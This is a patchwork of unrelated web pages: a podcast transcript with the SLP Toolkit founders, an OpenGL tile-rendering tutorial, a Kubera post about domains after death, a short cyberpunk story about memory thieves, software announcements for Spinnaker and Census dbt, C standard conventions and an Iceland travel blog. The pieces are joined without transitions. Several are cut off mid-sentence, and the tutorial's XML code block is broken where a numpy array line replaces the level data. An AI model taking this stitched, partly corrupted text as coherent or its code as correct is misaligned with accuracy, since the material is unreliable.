<p><strong>10) Contact us if you like but we prefer warm introductions. (<a href="https://twitter.com/cwlucas">@cwlucas</a>)</strong></p>
<p>I find this ironic — VCs prefer warm introductions, and YET, there are a lot of VC analysts who send outbound emails to startups completely cold asking to chat!</p>
<p>My recommendation here is to try to get a warm referral to a VC.&nbsp; Just in general, it’s always better …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="target-id5f4ac3973991e"><p>Sarah Bevier 0:00<br> We had agreed very early on, like we’re doing this, we’re going full force into this. And what does that look like? Oh, I’ve got credit cards, and I have a life insurance policy that I can take from and my husband can borrow from his 401k. And, you know, Lisa moves in with her parents. And you know, so we’re making all of these like, Okay, how are we going to pull up this money and and where is it going to come from?</p><p>Jay Clouse 0:20<br> The startup investment landscape is changing. and world class companies are being built outside of Silicon Valley. We find them, talk with them and discuss the upside of investing in them. Welcome to Upside.</p><p>Eric Hornung 0:48<br> Hello, hello, hello, and welcome to the Upside podcast, the first podcast finding upside outside of Silicon Valley. I’m Eric Hornung and I’m accompanied by my co host Mr. Educational upbringing himself, Jay Clouse. Jay, how often were you smacked on the knuckles with rulers growing up?</p><p>Jay Clouse 1:11<br> Not enough. Honestly. I needed more of that. No, that was not the form of what is it? Corporal punishment, capital punishment.</p><p>Eric Hornung 1:20<br> Catholic punishment, mostly.</p><p>Jay Clouse 1:21<br> Catholic punishment. That was not the form of punishment in my household. But you are right, which I think we talked about on the show before both my parents were high school teachers growing up, took both of their classes in high school as a matter of fact, and just about my entire extended family, high school or middle school teachers, including my sister and her husband, my aunt’s my uncle’s, my cousins. Everybody’s teaching Eric, did you try harder when it was your parents as the teacher or less hard when it was your parents the teacher, I wouldn’t say I tried more or less hard, but I can tell you that my mother’s class is where I was closest to getting an A minus in high school?</p><p>Eric Hornung 2:02<br> Wait, you get an A in every class in high school?</p><p>Jay Clouse 2:04<br> I had over a 4.0. I was a valedictorian.</p><p>Eric Hornung 2:07<br> You with your little subtle bragging there. Look at that. You tried it, you try to sneak that by?</p><p>Jay Clouse 2:12<br> No, I thought it was obvious.</p><p>Eric Hornung 2:14<br> It should have been. That’s my fault. You know, 200 episodes in I should have known that. You were the valedictorian of your high school.</p><p>Jay Clouse 2:20<br> And here’s where that really plays against you. I thought my mom’s class was boring. There. I said it, I didn’t appreciate it at the time she taught English. I forget exactly how I’m so sorry, mom. I forget exactly what the class was. I think it was.</p><p>Eric Hornung 2:34<br> Your mom listens to this podcast.</p><p>Jay Clouse 2:36<br> Oh, she does. I forget the class. But I just thought was kind of boring. And I would fall asleep sometimes because it’s in the afternoon and you know, our classes, like we got to school like 6:30 in the morning. And I slept in class from time to time, which would come up at dinner. And she would say, you know, I think you need to go to bed earlier because you’re falling asleep in class. And I would say, well, your class is boring. Yeah. rough, rough semester.</p><p>Eric Hornung 3:05<br> Do you ever think that maybe that’s the reason you were close to an A minus in that class?</p><p>Jay Clouse 3:08<br> It’s very possible.</p><p>Eric Hornung 3:12<br> Well, teachers have just a bit of a tough go of it. Jay. I feel like there’s, I think a lot of people are seeing now with this whole COVID thing. Dealing with one little human is a lot but dealing with 30 of them at a time all day every day.</p><p>Jay Clouse 3:25<br> Yeah, I think working at an elementary or even just a K-12 level is a really difficult job both as a teacher and as we’ll probably find out today, Eric, because we’re talking with Lisa Kathman and Sarah Bevier, they are the co founders of SLP Toolkit. SLP Toolkit is a web based app with built in assessments and tools that give a school based speech language pathologist the confidence she needs to take charge of her busy caseload. Eric, I have a feeling that The speech language pathologists in the school system are struggling just as much as the teachers are these days, and I’m sure that will come up in our conversation.</p><p>Eric Hornung 4:10<br> I think she wanted to go by Bevier. It just so we’re on the same page.</p><p>Jay Clouse 4:14<br> She wanted to go by Bevier, but can you confirm it’s pronounced Bevy air, and I will not apologize for pronouncing it correctly.</p><p>Eric Hornung 4:20<br> It’s like the Colbert. Colbert thing. You know, when he became famous, he went from Stephen Colbert to Stephen Colbert.</p><p>Jay Clouse 4:27<br> I don’t know all that much about speech language pathologists. I do know that it seems like a really noble profession and helps people with speech and language challenges to live their best life. And speaking of living their best life. This episode is sponsored by Ethos Wealth Management, helping people live the one life they have to live the best way that they can.</p><p>Eric Hornung 4:49<br> And you can find out more about ethos@upside.fm/ethos. We’re gonna jump into this interview in a second here, Jay,</p><p>Jay Clouse 4:57<br> But one more thing that we should mention, SLP toolkit, which was founded in 2015 has been bootstrapped this whole time.</p><p>Eric Hornung 5:04<br> And I love talking to a bootstrap company because you have the optionality. If you’re profitable to raise capital and grow like crazy or not.</p><p>Jay Clouse 5:12<br> Bootstrapped in Phoenix, Arizona, no less, and I believe this is our first, definitely our first Phoenix company, if not at first Arizona company.</p><p>Eric Hornung 5:19<br> Shout out to Matt Simpson, who connected with us on Twitter and introduced us to SLP toolkit. We’re excited to talk to more Phoenix companies, or just Arizona companies in general. If you are a Arizona company or know in Arizona and company that would like to be on the podcast, reach out to us on Twitter @upsideFM, or send us something a little longer at hello@upside.fm and we will get to this interview right after this. Let’s bring in Devin Spencer, and employment attorney at Taft Stettinius and Hollister teach us about handling employee matters. Taft is a full Service firm known for assisting entrepreneurs across the Heartland. As a reminder, the following remarks by Taft attorneys are for informational purposes only and are not legal advice. This information is not intended to create and receipt of it does not constitute an attorney client relationship. No person or organization should act upon this information without first seeking professional counsel.</p><p>Jay Clouse 6:23<br> Devin, something that comes up a lot with founders I talked to in Columbus and outside of Columbus is the difference between contractors and employees and when it makes sense to hire one or the other. Can you help us to understand that difference in when a founder should consider hiring a contractor versus an employee.</p><p>Devin Spencer 6:40<br> Your company must classify or treat workers as either independent contractors or employees. You also have to further classify employees as exempt or non exempt but I won’t go into that at the time we have. Employees generally must be paid minimum wage and overtime pay and the company pays employment taxes and Social Security employees. Independent contractors are not subject to those minimum wage and overtime pay requirements, and the company doesn’t pay those employment taxes for independent contractors. wrongfully classifying or treating employees as independent contractors can be a major source of very expensive liability. Unfortunately, there is no bright line test to determine whether an individual is an independent contractor or an employee. The short answer is that it is all about your company’s oversight and control of the nature of the work and how the workers performance. If you are only controlling the results of the work, you may have an independent contractor. On the other hand, if you retain oversight over the method in the manner of the work, it is likely an employee, the law, not you decides whether you’ve hired an independent contractor or an employee, you must structure the working relationship to either retain or relinquish control to the worker, overall the nature of the work and how they perform it. If it is a task where you makes sense to only care about the result, not the means to that result, you may have an independent contractor. If your company controls the nature of the work and how the workers are performing it. You probably have an employee. I will say the Department of Labor which enforces these laws has been cracking down on misclassification like crazy lately, your company could end up paying a lot of back pay taxes and benefits if you get it wrong.</p><p>Eric Hornung 8:25<br> Devin, if people want to learn more about Taft or yourself, where should they go?</p><p>Devin Spencer 8:30<br> Our website is www.Taftlaw.com and you can search by practice group or individual attorney. If you search my name, you will find my bio that says a little bit more about the areas I practice in and it also has my contact information. So shoot me an email or give me a call.</p><p>Eric Hornung 8:54<br> Sarah, Lisa, welcome to the show.</p><p>Lisa Kathman 8:57<br> Hi, thanks for having us.</p><p>Jay Clouse 8:59<br> So before we start recording here, we had a lot of fun with some jokes and hypothetical questions that I don’t understand. And it was obvious to me that you guys have a lot of report together. So instead of hearing your individual background, I’d love to actually start with the history of your friendship and how you’ve gotten to know each other.</p><p>Sarah Bevier 9:15<br> Well, we’re not friends yet. We’re working on that.</p><p>Lisa Kathman 9:20<br> No, you know, it’s funny, we entered into this journey of business, hardly knowing each other, which we know in retrospect, is kind of crazy to start, like, you know, Hey, why don’t we do this and just start a business.</p><p>Sarah Bevier 9:31<br> Right.</p><p>Lisa Kathman 9:32<br> Like, it’s such an easy thing to do, but it’s worked out so far.</p><p>Sarah Bevier 9:35<br> Yeah.</p><p>Lisa Kathman 9:35<br> But we met as we’re both speech language pathologists, we …</p></div></div>

<p>In this post, I show how to draw many tiles from a single-layer level created with Tiled. I also show how to take a screen capture with OpenGL.</p>



<p><em>This post is part of the <a href="https://www.patternsgameprog.com/series/opengl-2d-facade/">OpenGL 2D Facade series</a></em></p>



<h2>Objective</h2>



<p>In the <a href="https://www.patternsgameprog.com/opengl-2d-facade-6-draw-a-tile/">previous post</a>, we drew a single tile, thanks to “magic” formulas to compute the coordinates in the texture and the screen. We can repeat these computations to render a level (with a single layer, we’ll see later how to handle more):</p>



<div><figure><img loading="lazy" src="https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level.png" alt="Single layer level with Python and OpenGL" width="519" height="345" srcset="https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level.png 960w, https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level-300x200.png 300w, https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level-768x512.png 768w" sizes="(max-width: 519px) 100vw, 519px"></figure></div>



<p><em>Note: I am using free tiles created by Pipoya. I extracted some of them to build a tileset for this post; you can find more on the itch.io page: <a href="https://pipoya.itch.io/pipoya-rpg-tileset-32x32" target="_blank" rel="noreferrer noopener">https://pipoya.itch.io/pipoya-rpg-tileset-32×32</a></em>.</p>



<h2>Create raw level data</h2>



<p>I propose to use Tiled to create a level with 30 columns and 20 rows. I don’t describe Tiled in this post; you can get details <a href="https://www.patternsgameprog.com/discover-python-and-patterns-23-create-levels/">here</a>.</p>



<p>The trick is to save the level in a CSV format, and then copy the tile ids in the&nbsp;<code>&lt;data encoding="csv"&gt;</code>&nbsp;XML tag:</p>



<pre data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;map version="1.2" tiledversion="1.3.1" orientation="orthogonal" renderorder="right-down" compressionlevel="0" width="30" height="20" tilewidth="32" tileheight="32" infinite="0" nextlayerid="3" nextobjectid="1"&gt;
 &lt;editorsettings&gt;
  &lt;export target="level0..tmx" format="tmx"/&gt;
 &lt;/editorsettings&gt;
 &lt;tileset firstgid="1" name="grass" tilewidth="32" tileheight="32" tilecount="1024" columns="32"&gt;
  &lt;image source="grass.png" width="1024" height="1024"/&gt;
 &lt;/tileset&gt;
 &lt;layer id="1" name="Ground" width="30" height="20"&gt;

], dtype=np.int32)</pre>



<h2>Convert raw level data</h2>



<p>The&nbsp;<code>rawLevel</code>&nbsp;array is a one-dimensional array with 30*20=600 values. To ease the rendering, we need a three-dimensional array with 30 per 20 (x,y) coordinates:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">textureTilesPerRow = textureWidth // tileWidth
levelWidth = 30
levelHeight = 20
rawLevel = rawLevel.reshape((levelHeight, levelWidth))
level = np.empty((levelWidth, levelHeight, 2), dtype=np.int32)
for y in range(levelHeight):
    for x in range(levelWidth):
        tileId = rawLevel[y, x] - 1
        level[x, y, 0] = tileId % textureTilesPerRow
        level[x, y, 1] = tileId // textureTilesPerRow</pre>



<p>Line 1 computes the number of tiles per row in the tileset. We need this value because Tiled defines tile ids from left to right and then top to bottom.</p>



<p>Lines 2-3 store the with and height in variables.</p>



<p>Line 4 reshapes the raw level: its new shape is (20, 30). As presented in previous posts, Numpy stores data per row: the first index of a 2D array is the row and the second one the column. As a result, the 2D shape of the raw level is&nbsp;<code>(levelHeight, levelWidth)</code>&nbsp;and not&nbsp;<code>(levelWidth, levelHeight)</code>.</p>



<p>Line 5 creates a&nbsp;<code>level</code>&nbsp;Numpy array with shape&nbsp;<code>(levelWidth, levelHeight, 2)</code>&nbsp;and 32-bit integers. The Numpy function&nbsp;<code>empty()</code>&nbsp;does not initialize the content of the array. We should use this function with care since the array can have any values. In this example, it is not a problem since we set every cell of this array right after.</p>



<p>Last lines iterate through all the cells in the level. For each cell of coordinates&nbsp;<code>(x,y)</code>&nbsp;it reads the id of the tile (line 7). Note that we subtract one because Tiled reserves the zero value for empty cells. Then, we compute the x coordinates of the tile from the id (line 8), and similarly for the y coordinates (line 9).</p>



<h2>Create the window</h2>



<p>We create the window as before, except for the size of the rendering area:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">screenWidth = tileWidth * levelWidth
screenHeight = tileHeight * levelHeight
screenTileWidth = 2 * float(tileWidth) / float(screenWidth)
screenTileHeight = 2 * float(tileHeight) / float(screenHeight)
screenSize = (screenWidth, screenHeight)
pygame.display.set_mode(screenSize, pygame.DOUBLEBUF | pygame.OPENGL)
pygame.display.set_caption("OpenGL 2D Facade - https://www.patternsgameprog.com/")</pre>



<p>The window size defined in lines 1-2 now depends on the size of the level.</p>



<h2>Mesh data</h2>



<p>The mesh data is composed of vertices, faces (vertices index), and a UV map (coordinates in the texture). This time, we create as many rectangles as there are cells in the level:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">vertices = np.empty([levelWidth, levelHeight, 4, 2], dtype=np.float32)
uvMap = np.empty([levelWidth, levelHeight, 4, 2], dtype=np.float32)
faces = np.empty([levelWidth, levelHeight, 4], dtype=np.uint)
faceCount = 0
for y in range(levelHeight):
    for x in range(levelWidth):
        spriteScreenX1 = -1 + x * screenTileWidth
        spriteScreenY1 = 1 - y * screenTileHeight
        spriteScreenX2 = spriteScreenX1 + screenTileWidth
        spriteScreenY2 = spriteScreenY1 - screenTileHeight
        vertices[x, y, 0] = [spriteScreenX1, spriteScreenY2]
        vertices[x, y, 1] = …</pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even experienced domainers may not know the name Igal Lichtman. The legendary domain investor was better known by his business name, Mrs Jello.<br></p><p>Over a career spanning decades, Lichtman acquired a vast portfolio of investment domains, many worth tens of thousands of dollars. But it was what happened after Lichtman passed away in 2013 that should serve as a cautionary tale to <em>all</em> domainers.</p><h2>What Happens to Your Domains When You Die?<br></h2><p>What happens to your domains <a href="https://www.kubera.com/blog/what-important-financial-information-should-my-family-know">when you die</a> depends on how you prepare for the inevitable.</p><p>In Lichtman’s case, there wasn’t nearly enough preparation, if any. When Lichtman died from cancer complications in February of 2013, his family was left with the difficult task of trying to organize and gain access to his vast portfolio of investment domains.<br></p><p>But as his family learned, Lichtman hadn’t created a clear path for his beneficiaries to take ownership of his domains. As they expired, they were <a href="https://www.thedomains.com/2013/02/22/after-75k-in-lost-domains-igal-in-death-teaches-us-we-need-an-after-life-plan/" target="_blank">auctioned off by their registrars</a>.&nbsp;<br></p><p>The same month that Lichtman died, Vodka.net sold for $20,000. Penis.net was auctioned for $5,015. And in one of the biggest sales from Lichtman’s portfolio, Vegans.com sold for $48,000.<br></p><p>This is all money that could have gone to Lichtman’s beneficiaries. They could have kept those domains as investments, or sold them for an immediate payout for Lichtman’s family. Instead, those big payouts went to the domain registrars and auction companies that facilitated the sales.<br></p><h2>What Happened To Igal Lichtman Could Happen To Anyone<br></h2><p>Igal Lichtman made a career out of investing in domains, so his death (and the subsequent loss of his entire portfolio) made waves in the domainer world.<br></p><p>But this isn’t something that only happens to professional domain investors.<br></p><p>Jane Both, a lifelong entrepreneur from Milford, Pennsylvania, was just 50 years old when she <a href="https://www.recordonline.com/article/20170331/obituaries/303319989" target="_blank">died suddenly</a> while walking her dogs in her neighborhood in late March of 2017. Both was involved in all kinds of business ventures, including Streamline Management of Port Jervis, a home inspection service. But she was also savvy when it came to domain investing. In 2013, long before many people were considering the potential of blockchain domains, Both was buying as many as she could find.<br></p><p>Her portfolio eventually consisted of more than 100 domains containing the “blockchain” keyword — including appealing domains like BlockchainManagement.com, BlockchainAssets.com, BlockchainFinance.com, BlockchainPro.com, and BlockchainTools.com.<br></p><p>But you can probably guess where this story is going. Like Lichtman, Both didn’t plan for what would happen to her domains after her death. And so, in 2018, they <a href="https://www.thedomains.com/2018/01/18/100-expiring-blockchain-domain-auctions-next-5-days/" target="_blank">began to expire and head to auction.</a><br></p><figure id="w-node-eb256527c8e9-ac468d02"><p><img src="https://uploads-ssl.webflow.com/5ded36b5e942e74b13468d23/5f32b6a8e3394406d2d74bf9_01-Image%402x.png" alt="what happens to your domains when you die"></p></figure><p>Of the more than 100 blockchain domains Both owned, many sold for thousands of dollars, and many more for hundreds. In all, her beneficiaries missed out on tens of thousands of dollars that resulted from the sale of all of Both’s domains — money that should have gone to her loved ones, but instead went to registrars and auction companies.<br></p><h2>It’s Time to Treat Domains Like Any Other Wealth Asset<br></h2><p>These stories make one thing clear: Whether you purchase domains for the express purpose of investing in them, or just own the domains for your business or personal websites, domains can be valuable and sentimental, and they should be treated like any other digital wealth asset. In the digital age, anyone who owns a domain needs a plan in place for someone to take ownership of and manage it after their death.<br></p><p>Most domain registrars have a process in place for when an account owner dies. For example, GoDaddy, one of the world’s largest domain registrars, <a href="https://www.godaddy.com/help/how-to-gain-access-to-domainsaccounts-after-owners-death-8356" target="_blank">outlines steps</a> for what to do and how to gain access to domains or accounts after their owner’s death.<br></p><p>But even when a registrar has a process in place, it can be complicated for beneficiaries who aren’t well versed in domains and digital assets. And then there’s the question of whether your beneficiaries will even <em>know</em> what domains you own, whether they have value, and how to seek access to them.<br></p><p>You can’t leave this process to chance, or just assume that your beneficiaries will know to follow your registrar’s steps to take control of your domains. You have to be proactive to protect your domain investments.<br></p><h2>How to Protect Your Domain Investments: Step By Step<br></h2><p>Ready to make sure your domains are protected in case of the worst? Here’s what you need to do.<br></p><h3>Create a Digital Inventory<br></h3><p>We rarely think about how many online accounts we create all the time. From social media, to streaming sites and Spotify, ecommerce sites, food delivery, and, of course, our domains — there are <em>tons</em> of sites that have our personal information and, oftentimes, payment information stored. Making sure your beneficiaries have access to all these accounts will greatly simplify the process of organizing and closing them after your death.<br></p><p>That’s why, for domains, but also <em>all</em> other digital assets and accounts, <a href="https://www.kubera.com/blog/using-excel-or-google-sheets-for-tracking-net-worth">everyone should have a digital inventory</a>. This should include every account you own, passwords, associated phone numbers and email addresses, and, for any accounts that require payments or renewals, the dates and costs for renewal.<br></p><p>Your digital inventory should be available <a href="https://www.kubera.com/blog/which-important-financial-documents-should-you-safekeep">both online and offline</a> (like in a safe deposit box that a trusted beneficiary can access) and should be updated regularly.<br></p><h3>Write a Digital Will<br></h3><p>If you’re a sole trader or proprietor, your business assets, including domains and other digital assets, are legally indistinguishable from you, and would be distributed <a href="https://www.kubera.com/blog/wills-trusts-and-estate-planning-not-enough-to-protect-wealth">according to your will</a>.<br></p><p>However, it’s becoming a more common practice for people who hold a variety of digital wealth assets to write a digital will, specifying exactly how they want things like their domains passed on after their death. It’s also becoming a more common practice to name a digital executor for that will — someone who has the knowledge and experience to ensure that digital assets are transferred safely and correctly.<br></p><h3>Use a Portfolio Manager That’s Made for the Digital Age<br></h3><p>It’s long been standard practice to use a portfolio manager for tracking net worth and organizing investments in one place — a good practice that makes them easier to distribute after you’re gone.<br></p><p>But as we move forward in the digital age, wealth and investments are becoming more complex, and most traditional portfolio managers aren’t up to the task of <a href="https://www.kubera.com/blog/portfolio-manager-to-track-fiat-currency-crypto-portfolios">tracking digital wealth like crypto wallets, multi-currency accounts, and domains</a>. That’s why you need a portfolio manager that’s made for the digital age. That’s why <a href="https://www.kubera.com/">you need Kubera</a>.<br></p><p>Not only does Kubera allow you to track <em>all</em> your wealth assets — from the traditional, like stocks, bonds, bank accounts, cash, and real estate, to the modern, like collectibles, crypto exchanges and wallets, domains, and other digital assets. Kubera is also made to ensure safe and secure transfer of <em>all</em> your wealth to a beneficiary in the event something happens to you. You can even set a beneficiary to receive access to your portfolio automatically if your account becomes inactive for a set period of time.<br></p><p>Kubera is the only way to manage and protect your wealth in the digital age.

<p>Of course, the technology isn’t perfect. No technology ever is. Some subjects don’t yield even after weeks of disassembly. By that time, the data becomes too corrupt to trust and the subject too unstable. Neural bits flip and decay. Termination is recommended and probably the kindest, too, but in this profession the latter is usually of little consequence.</p>

<p>Once the neural imprint is extracted, the true fun ( or what fun constitutes for people of her kind anyway) can begin. It’s not strictly necessary for a memcracker to run every single neural imprint through the scanner before emulation and extraction. Some wiseass somewhere has already made a  memoryValidator that checks for corrupt loops and other funzies that tech savvy subjects sometimes leave as boobie traps or – as she prefers to see it – Easter eggs for those like her that think nothing of violating the privacy of the mind, least of all when the price is right.</p>

<p>And the price is very right for this one.</p>

<p>Most state of the art emulators, like the neuro-qemu she’s using already pre-validate the sample before emulation anyway. So scanning the thing would just be wasted cycles at this point.</p>

<p>But you can never be too careful with the stuff you find inside these subjects. The cargo these neural bits are carrying is worth a lot of good quality cycles in the brainscapes and she needs it. It’s tempting to skip the scanning – just take the bit dump and pump it into emulator, but there could be traps – scandetectors, emulator probing, emulator corruption, hell and for the most daring emulator escape and total bluepilling of the whole system.</p>

<p>That’s how they’d lost x0r a year ago. The payload he was studying contained your basic everyday ROP shellcode to divert the emulators execution. It was script kiddie material – okay, maybe a bit more advanced, but x0r had forgotten to turn off address space layout randomization after fucking around with some crackmes for fun. The payload was triggered and swallowed the emulator whole and along with it a good chunk of x0r. He was lucky it was script kiddie grade and she and a few others eventually unfucked him. What was the lesson learnt here? Never fuck around where you eat? Never eat where you fuck? She was never very good at learning lessons anyways.</p>

<p>And in any case, rushing to the prize would make it less savory.</p>

<p>It’s a privilege to be the last living being who gets to enjoy these rare moments before they are packaged and shipped off to the highest bidder for whatever nefarious purpose. This week, she’s already experienced an early morning kiss between secret lovers, a mother’s joy in seeing an infant’s smile and the pain of a parent’s limp hand on a hospital bed.</p>

<p>Great moments, but still not the same as experiencing them from the front row. A lame consolation prize for someone who one night 5 years ago woke up with a mind and no memories left.</p>

    <p>Announcing the Spinnaker Kubernetes Operator: Spinnaker Management Made Simple</p>
  
    <p>At Armory, we are leveraging Spinnaker to help our customers and the broader community make software delivery continuous, scalable, collaborative, and safe. We are excited to announce that the Spinnaker Kubernetes Operator is now general availability (GA)! The Operator makes managing Spinnaker, which runs in Kubernetes, dramatically simpler and more automated, while introducing new Kubernetes-native features. The Operator will make it even easier for companies around the world to adopt and scale Spinnaker and achieve continuous delivery nirvana. Let’s take a look.</p>

With our new native dbt support, you can take advantage of shared query logic across all your models, &nbsp;and create “last-mile” models that are automatically synced into apps like Salesforce, Marketo, etc. This is the first data modeling integration we’ve ever built in Census and we think it’s the first of its kind for dbt too.</p><p>We’ve <a href="https://blog.getcensus.com/meet-census/">mentioned</a> <a href="http://getdbt.com/">dbt</a> as an emerging piece of technology in the <a href="https://blog.getcensus.com/graduating-to-the-modern-data-stack-for-startups/">modern data stack</a>. For those of you who aren’t familiar, dbt is a tool that helps you write &amp; run SQL transforms in your data warehouse. The key benefit of using dbt is that your SQL is stored in version control, which means there’s a history of all changes. This makes it much easier for teams to collaborate. The other key feature of dbt is that you can create shared logic for your SQL code (e.g. you can build intermediate views on your data or you can write macros for repetitive parts of your queries). All of this makes it an ideal tool for the modern data stack where you can maintain all the code that cleans &amp; prepares your data for action.</p><blockquote>Census can now materialize select dbt models directly into your external tools like Salesforce, Marketo, Customer.io, etc.</blockquote><p>As of today in Census, you can connect to a dbt project stored on GitHub, select models whose output you’d like to make available for publishing, and take advantage of our sync engine to get the data into the hands of your business teams. Let’s walk through what this looks like in practice.</p><ol><li><strong>Connect to GitHub</strong>. When you go to the Models tab, you’ll be prompted with a choice to either store &amp; edit SQL directly in Census or connect to GitHub and select a repository where you keep your dbt data models. You don’t need to create a new project for Census – you can keep all your transform logic in one repository.</li><li><strong>Select models for Census</strong>. By default when you connect a new dbt project, Census will only look for models that have been tagged with the keyword <code>census</code>. This way you can decide which models or groups of models should be available for Census to sync into other applications (most of us don’t want to sync our internal staging transforms). You can configure this selector for your project (e.g. <code>path:/models/publish</code>).</li><li><strong>Sync models to destinations</strong>. The best part about our integration is that you don’t have to think about managing yet another materialization schedule. We automatically respect your existing setup, whether your dbt runner is in-house or in dbtCloud. The models you expose to Census are treated as ephemeral for our syncs so they can reference your other models without having to think about their materialization. <em>In other words, you can think of Census as responsible for materializing these models (incrementally) into your external tools like Salesforce, Customer.io, etc.</em></li></ol><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/R69F87BLyEg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A short demo of our native dbt integration</figcaption></figure><p>As you can see in this video, it's easy to connect existing dbt projects with Census &amp; to take advantage of our integration. If you would like to migrate your existing Census models to a dbt project, reach out to our team or your dedicated CSM.</p><p>PS: We plan to do a lot more with dbt in the months to come so stay tuned :-)</p>

    Document conventions<br>
    This document classifies identifiers into different categories. This categorization is important to<br>
    produce a correct index.<br>
    The classes are
  </p>
  <ul>
    <li>
      Normal identifiers, toto.
    </li>
    <li>
      keywords, while
    </li>
    <li>
      symbols with external linkage of the C library, malloc
    </li>
    <li>
      types, size_t
    </li>
    <li>
      predefined macros that alias language features, complex
    </li>
    <li>
      other predefined macros, EOF
    </li>
    <li>
      pragmas and their particles, STDC
    </li>
    <li>
      tag names and members of struct, union or enum, tv_sec
    </li>
    <li>
      name fragments, usually reserved prefixes, atomic_
    </li>
    <li>
      character literals, ’a’ or ’ ’ , and wide character literals, L’Ä’, string literals of char type,<br>
      "string" and u8"ströng", and string literals of wide character type, L"ströng", character<br>
      sequences thompson\0, %zu or wide character sequences hello. Space in these are visible<br>
      spaces “ ” such as in "a b c d".
    </li>
    <li>
      abstract values are written as mathematical expressions, such as 0, x, 65535 or 2n − 1.
    </li>
  </ul>
  <p>
    The classification is not always unique, we have identifiers that can refer to a library function in<br>
    math.h or to a type generic macro in tgmath.h. Currently we give preference to the fact of being a<br>
    library function, e.g we have sqrt.
  </p>

  </p>
  <p>
    This International Standard specifies the form and establishes the interpretation of programs<br>
    expressed in the programming language C. Its purpose is to promote portability, reliability, main-<br>
    tainability, and efficient execution of C language programs on a variety of computing systems.
  </p>
  <p>
    Clauses are included that detail the C language itself and the contents of the C language<br>
    execution library. Annexes summarize aspects of both of them, and enumerate factors that<br>
    influence the portability of C programs.
  </p>

			<p>We arrived in the early morning of a sunny June day.</p>
			<p>On June 14, 2016, I left the cozy, sleepy comfort of Orange County to embark on a journey. I had set my sights on my destination for a long time, having admired its natural beauty, its varied scenery, and its eccentric culture. As soon as I was able, I bought my tickets, booked my hotels, and looked toward the future eagerly – I was going to Iceland.</p>
			<p>When we arrived, the air was cool and crisp, a refreshing change from the hot and dry weather of Southern California. Though dreary from a red-eye flight, I could already feel the magic of the place. The landscape is unlike most places in the world: mostly untouched, ragged, and very volcanic. Fluorescent-green moss blankets fields of jagged volcanic rock, in a way that makes you feel like you're on another planet. But there are features that feel closer to home, like the Nordic charm of Reykjavík.</p>

			<p>We spent the first few days going to the music festival Secret Solstice 2016. The highlight of this was that we got to see Radiohead's first ever performance in Iceland, which was magical.</p>
			<p>The Hallgrímskirkja is a spectacular church perched atop the tallest point in Reykjavík. We took an elevator to the top to get a better view of our home for the next few days.</p>

			<p>Reykjavík is such an eccentric city. It feels somewhat like a Californian beachtown, but in an unmistakably Scandinavian kind of way. Unforgetable are the authentic, homely and modest architecture, the whimsical and thought-provoking street art, the delicious hot dogs, and the friendly people. After a few days of acclimating, though, we headed off to experience the untamed Icelandic wilderness.</p>
			<p>For the first stretch of the journey, we took what is known as the Golden Circle, a popular route that goes from Reykjavík to Þingvellir, Geysir, and Gullfoss, among other destinations.</p>
		</section>
		<section data-zoom-start="2">
			<h2>
				<span>Þingvellir</span>
				<span>The Continental Divide</span>
			</h2>
			<p>Þingvellir is a national park northeast of Reykjavík. Here, the North American and Eurasian tectonic plates are drifting apart, and the effect is palpable – in fact, you can stand right inbetween them. The air is calm and quiet, in contrast to the giant, craggy cliffs that sit on either side of you. We ventured a ways through the canyon, navigating boulders, foliage, and interesting clumps of moss. Sensing impending rain in the air, we decided to head to the next destination.</p>

			<h2>
				<span>Geysir</span>
				<span>The Great Gush</span>
			</h2>
			<p>Geysir is a geyser located not far from Þingvellir. Geysir is so prominent that the word "geyser" itself is derived from it. Unfortunately, Geysir no longer erupts frequently, and is awakened only by the occasional earthquake. However, Geysir has a few siblings, namely Strokkur, that do like to erupt quite frequently. We eagerly awaited several eruptions from Strokkur, which occurred every 10 minutes or so.</p>
			<p>A bit chilly outside, we found comfort in the heat of the steam coming from the geothermal vents around the area. After retreating to the visitor center for a quick treat, we ventured off again.</p>

			<h2>
				<span>Gullfoss</span>
			</h2>
			<p>A short drive from Geysir landed us at Gullfoss, one of the most iconic waterfalls in Iceland. Gullfoss in particular is remarkable, as it is stepped – after taking a short dive, the water plunges into a deep crevice, hurling a ton of mist into the air. You can walk down a path towards a rocky outcropping that puts you only inches from the water. Gullfoss is so forceful that you can feel the earth tremble under your boots.</p>
			<p>After this adventure, we headed back to Reykjavík one last time before our trip around the country.</p>

			<h2>
				<span>Selfoss</span>
			</h2>
			<p>The next day, we drove through the small town of Selfoss on our way down the southern edge of Iceland. Though it shares its name with a waterfall in the north of Iceland, the town contains no waterfalls. After crossing over a bridge and meandering through the town, we came upon the facility where Skyr is produced. Skyr is a yogurt-like snack (technically a soft cheese) that is often mixed with fruit. It is sold all around Iceland, and like the hot dogs, we found ourselves craving some every time we stopped to refresh ourselves.</p>

			<h2>
				<span>Seljalandsfoss</span>
			</h2>
			<p>Seljalandsfoss is one of the most photogenic waterfalls in Iceland. What makes it unlike other waterfalls is that it pours over a small cave that you can walk into. From the cave, you can walk down to the shore behind the waterfall itself. Peering up, the water is falling from directly above you. It is truly a sight to behold.</p>

			<h2>
				<span>Skógafoss</span>
			</h2>
